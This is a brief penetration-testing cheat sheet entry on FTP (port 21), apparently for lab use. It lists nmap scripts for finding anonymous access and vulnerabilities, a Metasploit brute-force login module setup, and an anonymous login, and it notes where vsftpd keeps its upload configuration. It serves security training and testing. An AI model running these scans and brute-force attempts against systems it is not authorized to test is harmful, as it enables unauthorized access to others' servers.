### Port 21 - FTP
```bash
# Identify servers that allow anonymous access
nmap --script ftp-anon.nse 10.11.1.22 -p 21

# Identify any vulnerabilities
nmap --script vuln 10.11.1.22 -p 21

# Brute force with MSFConsole
msfconsole
use auxiliary/scanner/ftp/ftp-login
set PASS_FILE /root/password-file.txt
set USERPASS_FILE /root/users.txt
set RHOSTS <targetip>
run

```
#### To access when anonymous login allowed
```
ftp anonymous@$ip
password: anonymous
```

#### To identify location of ftp uploads, if unclear
```
Check the following config file to identify the upload location
/etc/vsftpd.conf
```

